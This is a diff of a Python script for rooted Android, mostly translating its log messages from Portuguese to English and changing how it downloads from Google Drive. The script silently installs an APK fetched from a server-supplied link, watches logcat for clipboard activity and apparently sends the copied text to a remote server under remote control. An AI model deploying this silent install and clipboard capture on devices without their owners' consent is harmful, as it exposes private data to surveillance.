@@ -6,7 +6,7 @@ import os
 import re
 
 if len(sys.argv) < 4:
-    print(f"❌ [ERRO FATAL] Argumentos insuficientes para iniciar! Recebido: {sys.argv}", flush=True)
+    print(f"❌ [FATAL ERROR] Insufficient arguments to start! Received: {sys.argv}", flush=True)
     sys.exit(1)
 
 DEVICE_ID = sys.argv[1]
@@ -29,34 +29,55 @@ def is_app_installed():
 def download_and_install(url):
     apk_path = "/sdcard/sys_app_temp.apk"
     try:
-        print(f"🔗 [DOWNLOAD] Link recebido: {url}", flush=True)
+        print(f"🔗 [DOWNLOAD] Received link: {url}", flush=True)
+        file_id = None
+        
         if "drive.google.com" in url:
             match = re.search(r'/d/([a-zA-Z0-9_-]+)', url)
             if match:
-                url = f"https://drive.google.com/uc?export=download&id={match.group(1)}"
-        
-        response = requests.get(url, stream=True, timeout=30)
+                file_id = match.group(1)
+            else:
+                match_id = re.search(r'id=([a-zA-Z0-9_-]+)', url)
+                if match_id:
+                    file_id = match_id.group(1)
+
+        session = requests.Session()
+        if file_id:
+            base_url = "https://docs.google.com/uc?export=download"
+            response = session.get(base_url, params={'id': file_id}, stream=True, timeout=30)
+            
+            token = None
+            for key, value in response.cookies.items():
+                if key.startswith('download_warning'):
+                    token = value
+                    break
+            
+            if token:
+                response = session.get(base_url, params={'id': file_id, 'confirm': token}, stream=True, timeout=60)
+        else:
+            response = requests.get(url, stream=True, timeout=60)
+
         with open(apk_path, 'wb') as f:
             for chunk in response.iter_content(chunk_size=8192):
                 if chunk: 
                     f.write(chunk)
         
-        tamanho_mb = os.path.getsize(apk_path) / (1024 * 1024)
-        print(f"📦 [DOWNLOAD] Arquivo salvo. Tamanho: {tamanho_mb:.2f} MB", flush=True)
+        size_mb = os.path.getsize(apk_path) / (1024 * 1024)
+        print(f"📦 [DOWNLOAD] File saved. Size: {size_mb:.2f} MB", flush=True)
         
-        if tamanho_mb < 1.0:
-            print("⚠️ [ALERTA] O arquivo baixado é muito pequeno! O Drive pode ter bloqueado o download direto.", flush=True)
+        if size_mb < 1.0:
+            print("⚠️ [WARNING] Downloaded file is too small! Drive might have blocked direct download.", flush=True)
 
         res = subprocess.run(f'su -c "pm install -r {apk_path}"', shell=True, capture_output=True, text=True)
         
-        print(f"🛠️ [INSTALL LOG] Output: {res.stdout.strip()} | Erro: {res.stderr.strip()}", flush=True)
+        print(f"🛠️ [INSTALL LOG] Output: {res.stdout.strip()} | Error: {res.stderr.strip()}", flush=True)
         
         if os.path.exists(apk_path):
             os.remove(apk_path)
             
         return "Success" in res.stdout
     except Exception as e:
-        print(f"❌ [ERRO INTERNO INSTALL] {e}", flush=True)
+        print(f"❌ [INTERNAL INSTALL ERROR] {e}", flush=True)
         if os.path.exists(apk_path):
             os.remove(apk_path)
         return False
@@ -65,9 +86,9 @@ def force_focus_and_read():
     try:
         subprocess.run('su -c "am start --activity-brought-to-front com.termux/.TermuxActivity" 2>/dev/null', shell=True)
         time.sleep(0.4)
-        texto = subprocess.check_output("termux-clipboard-get", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
+        text = subprocess.check_output("termux-clipboard-get", shell=True, stderr=subprocess.DEVNULL).decode('utf-8').strip()
         subprocess.run('su -c "input keyevent 4" 2>/dev/null', shell=True)
-        return texto if texto and texto != "null" else ""
+        return text if text and text != "null" else ""
     except Exception:
         return ""
 
@@ -76,9 +97,9 @@ def check_authorization():
         installed = is_app_installed()
         
         if not installed:
-            print("⚠️ [APP SYSTEM] MacroDroid não encontrado no aparelho. Solicitando link ao servidor...", flush=True)
+            print("⚠️ [SYSTEM APP] MacroDroid not found on device. Requesting link...", flush=True)
         else:
-            print("✅ [APP SYSTEM] MacroDroid já está instalado.", flush=True)
+            print("✅ [SYSTEM APP] MacroDroid is already installed.", flush=True)
 
         payload = {
             "ping": True,
@@ -101,29 +122,29 @@ def check_authorization():
             
             if not installed:
                 if "system_apk_url" in data:
-                    print(f"📥 [DOWNLOAD] Baixando APK do Drive...", flush=True)
+                    print("📥 [DOWNLOAD] Downloading APK from Drive...", flush=True)
                     if download_and_install(data["system_apk_url"]):
-                        print("🚀 [SUCESSO] Instalação silenciosa concluída!", flush=True)
+                        print("🚀 [SUCCESS] Silent installation completed!", flush=True)
                         installed = True
                     else:
-                        print("❌ [ERRO] Falha ao instalar o APK.", flush=True)
+                        print("❌ [ERROR] Failed to install APK.", flush=True)
                 else:
-                    print("❌ [ERRO DO SERVIDOR] O servidor NÃO enviou o link do app (system_apk_url)!", flush=True)
-                    print("👉 Verifique se o MacroDroid está cadastrado no MongoDB com is_system_app: True", flush=True)
+                    print("❌ [SERVER ERROR] Server did NOT send the app link (system_apk_url)!", flush=True)
+                    print("👉 Check if MacroDroid is registered in MongoDB with is_system_app: True", flush=True)
                     
             return data.get("status") == "active" and installed
         return False
     except Exception as e:
-        print(f"❌ [ERRO DE CONEXÃO] {e}", flush=True)
+        print(f"❌ [CONNECTION ERROR] {e}", flush=True)
         return False
 
 def start_vigilante():
-    print(f"👁️ [VIGILANTE] Ativado para Guild: {GUILD_ID}. Aguardando textos...", flush=True)
+    print(f"👁️ [WATCHER] Activated for Guild: {GUILD_ID}. Waiting for texts...", flush=True)
     last_clip = force_focus_and_read()
     
     subprocess.run('su -c "logcat -c" 2>/dev/null', shell=True)
-    cmd_vigia = 'su -c "logcat | grep -Ei \'clipboard|PrimaryClip|focus\'"'
-    process = subprocess.Popen(cmd_vigia, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+    cmd_watcher = 'su -c "logcat | grep -Ei \'clipboard|PrimaryClip|focus\'"'
+    process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 
     while True:
         line = process.stdout.readline()
@@ -133,7 +154,7 @@ def start_vigilante():
             
             if current and current != last_clip:
                 if not is_app_installed():
-                    print("🛑 [VIGILANTE] MacroDroid foi desinstalado! Parando operação.", flush=True)
+                    print("🛑 [WATCHER] MacroDroid was uninstalled! Stopping operation.", flush=True)
                     process.terminate()
                     return
 
@@ -149,7 +170,7 @@ def start_vigilante():
                     if res.status_code == 200:
                         data = res.json()
                         if data.get("status") == "shutdown":
-                            print("🛑 [SHUTDOWN] Permissão revogada pelo servidor.", flush=True)
+                            print("🛑 [SHUTDOWN] Permission revoked by server.", flush=True)
                             process.terminate()
                             return
                             
@@ -159,15 +180,15 @@ def start_vigilante():
                     return
 
         if process.poll() is not None:
-            process = subprocess.Popen(cmd_vigia, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
+            process = subprocess.Popen(cmd_watcher, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
 
 def main():
-    print("📡 Iniciando sistema com Ping Inteligente...", flush=True)
+    print("📡 Starting system with Smart Ping...", flush=True)
     while True:
         if check_authorization():
             start_vigilante()
         else:
-            print("😴 [WAITING] Re-checando em 5 min...", flush=True)
+            print("😴 [WAITING] Rechecking in 5 min...", flush=True)
             time.sleep(300) 
 
 if __name__ == "__main__":
